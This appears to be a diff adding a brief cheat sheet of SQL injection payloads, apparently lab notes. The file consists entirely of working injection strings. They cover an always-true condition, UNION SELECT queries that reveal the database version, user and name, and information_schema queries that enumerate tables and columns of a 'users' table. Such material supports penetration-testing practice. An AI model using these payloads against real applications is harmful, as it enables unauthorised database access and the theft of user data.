@@ -1,0 +1,10 @@
+a) Always True Scenario
+-> %' or '0'='0
+b) Display Database Version, User, Name
+-> %' or 0=0 union select null, version() #
+-> %' or 0=0 union select null, user() #
+-> %' or 0=0 union select null, database() #
+c) Display all the table field
+-> %' and 1=0 union select null, table_name from information_schema.tables where table_name like 'user%'#
+d) Display all the column field
+-> %' and 1=0 union select null, concat(table_name,0x0a,column_name) from information_schema.columns where table_name = 'users' #
